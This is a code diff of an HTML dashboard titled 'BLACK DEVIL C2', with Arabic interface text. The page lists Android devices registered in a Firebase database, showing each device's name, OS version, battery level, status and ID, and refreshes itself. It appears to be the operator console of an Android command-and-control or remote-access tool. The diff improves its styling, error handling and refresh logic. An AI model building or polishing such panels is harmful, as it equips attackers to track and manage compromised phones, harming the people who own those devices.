@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,21 +7,83 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family:sans-serif; }
-        body { background:#0a0a0a; color:#e0e0e0; padding:20px; }
-        h1 { color:#ff1744; text-align:center; margin-bottom:20px; }
-        .card { background:#1a1a1a; border:1px solid #333; border-radius:12px; padding:15px; margin:10px 0; cursor:pointer; }
-        .card:active { background:#2a0a0a; border-color:#ff1744; }
-        .device-name { font-size:18px; font-weight:bold; }
-        .device-info { color:#888; font-size:14px; }
-        .status { color:#4caf50; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Cairo',sans-serif; }
+        body { 
+            background:#0a0a0a; 
+            color:#e0e0e0; 
+            padding:20px; 
+            min-height:100vh;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+        }
+        h1 { 
+            color:#ff1744; 
+            font-size:28px; 
+            margin:20px 0;
+            text-shadow:0 0 30px #ff174488;
+            border-bottom:2px solid #ff1744;
+            padding-bottom:10px;
+            width:100%;
+            text-align:center;
+        }
+        .device-card {
+            background:#1a1a1a;
+            border:1px solid #333;
+            border-radius:16px;
+            padding:18px 20px;
+            margin:10px 0;
+            width:100%;
+            max-width:500px;
+            cursor:pointer;
+            transition:0.3s;
+            box-shadow:0 4px 15px rgba(0,0,0,0.5);
+        }
+        .device-card:active {
+            background:#2a0a0a;
+            border-color:#ff1744;
+            transform:scale(0.98);
+        }
+        .device-name { font-size:20px; font-weight:bold; color:#fff; }
+        .device-info { color:#888; font-size:14px; margin:5px 0; }
+        .device-status { color:#4caf50; font-size:14px; }
+        .device-id { color:#666; font-size:11px; margin-top:5px; }
+        .loading {
+            color:#ff1744;
+            font-size:18px;
+            text-align:center;
+            padding:40px;
+        }
+        .error {
+            color:#ff1744;
+            text-align:center;
+            padding:20px;
+            background:#1a0a0a;
+            border-radius:12px;
+            border:1px solid #ff1744;
+        }
+        .refresh-btn {
+            background:#ff1744;
+            color:#fff;
+            border:none;
+            padding:12px 30px;
+            border-radius:30px;
+            font-size:16px;
+            font-weight:bold;
+            margin:20px 0;
+            cursor:pointer;
+        }
+        .refresh-btn:active { transform:scale(0.95); }
     </style>
 </head>
 <body>
+
     <h1>💀 BLACK DEVIL C2</h1>
-    <div id="devices">⏳ جاري تحميل الأجهزة...</div>
+    <button class="refresh-btn" onclick="loadDevices()">🔄 تحديث</button>
+    <div id="devices" class="loading">⏳ جاري تحميل الأجهزة...</div>
 
     <script>
+        // 🔥 Firebase Configuration - غيّرها حسب مشروعك
         const firebaseConfig = {
             apiKey: "AIzaSyDummyKeyReplaceMe",
             authDomain: "your-project.firebaseapp.com",
@@ -31,39 +93,86 @@
             messagingSenderId: "123456789",
             appId: "1:123456789:web:abcdef"
         };
-        firebase.initializeApp(firebaseConfig);
+
+        // تهيئة Firebase
+        try {
+            firebase.initializeApp(firebaseConfig);
+            console.log("✅ Firebase initialized");
+        } catch (e) {
+            console.error("❌ Firebase init error:", e);
+            document.getElementById('devices').innerHTML = 
+                '<div class="error">❌ خطأ في تهيئة Firebase: ' + e.message + '</div>';
+        }
+
         const db = firebase.database();
 
         function loadDevices() {
             const container = document.getElementById('devices');
-            db.ref('devices').once('value').then(snap => {
-                container.innerHTML = '';
-                if (!snap.exists()) {
-                    container.innerHTML = '❌ لا توجد أجهزة مسجلة';
-                    return;
-                }
-                snap.forEach(child => {
-                    const id = child.key;
-                    let data = child.val();
-                    try { data = JSON.parse(data); } catch(e) {}
-                    const card = document.createElement('div');
-                    card.className = 'card';
-                    card.innerHTML = `
-                        <div class="device-name">📱 ${data.device_name || 'جهاز'}</div>
-                        <div class="device-info">🤖 ${data.android_version || 'N/A'} | 🔋 ${data.battery || 0}%</div>
-                        <div class="status">🟢 ${data.status || 'online'}</div>
-                        <div style="font-size:12px;color:#666;">ID: ${id}</div>
+            container.innerHTML = '<div class="loading">⏳ جاري التحميل...</div>';
+
+            db.ref('devices').once('value')
+                .then(snapshot => {
+                    container.innerHTML = '';
+                    
+                    if (!snapshot.exists()) {
+                        container.innerHTML = '<div class="error">❌ لا توجد أجهزة مسجلة</div>';
+                        return;
+                    }
+
+                    let count = 0;
+                    snapshot.forEach(child => {
+                        count++;
+                        const id = child.key;
+                        let data = child.val();
+                        
+                        // محاولة تحويل JSON
+                        try {
+                            if (typeof data === 'string') {
+                                data = JSON.parse(data);
+                            }
+                        } catch(e) {
+                            // إذا لم يكن JSON، نستخدمه كما هو
+                        }
+
+                        const card = document.createElement('div');
+                        card.className = 'device-card';
+                        card.innerHTML = `
+                            <div class="device-name">📱 ${data.device_name || 'جهاز غير معروف'}</div>
+                            <div class="device-info">🤖 ${data.android_version || 'N/A'} | 🔋 ${data.battery || 0}%</div>
+                            <div class="device-status">🟢 ${data.status || 'online'}</div>
+                            <div class="device-id">🆔 ${id}</div>
+                        `;
+                        card.onclick = () => {
+                            alert(`✅ تم اختيار الجهاز: ${data.device_name || id}\n🆔 ID: ${id}`);
+                        };
+                        container.appendChild(card);
+                    });
+
+                    // إضافة العدد
+                    const countEl = document.createElement('div');
+                    countEl.style.cssText = 'color:#888;text-align:center;margin-top:15px;font-size:14px;';
+                    countEl.innerText = `📊 ${count} جهاز مسجل`;
+                    container.appendChild(countEl);
+
+                })
+                .catch(error => {
+                    console.error("❌ Firebase error:", error);
+                    container.innerHTML = `
+                        <div class="error">
+                            ❌ خطأ في Firebase: ${error.message}
+                            <br><br>
+                            <button onclick="loadDevices()" style="background:#ff1744;color:#fff;border:none;padding:10px20px;border-radius:10px;cursor:pointer;">🔄 إعادة المحاولة</button>
+                        </div>
                     `;
-                    card.onclick = () => alert(`✅ تم اختيار: ${data.device_name}\nID: ${id}`);
-                    container.appendChild(card);
                 });
-            }).catch(err => {
-                container.innerHTML = `❌ خطأ: ${err.message}`;
-            });
         }
 
-        loadDevices();
-        setInterval(loadDevices, 10000);
+        // تحميل الأجهزة عند فتح الصفحة
+        setTimeout(loadDevices, 1000);
+
+        // تحديث تلقائي كل 15 ثانية
+        setInterval(loadDevices, 15000);
     </script>
+
 </body>
 </html>
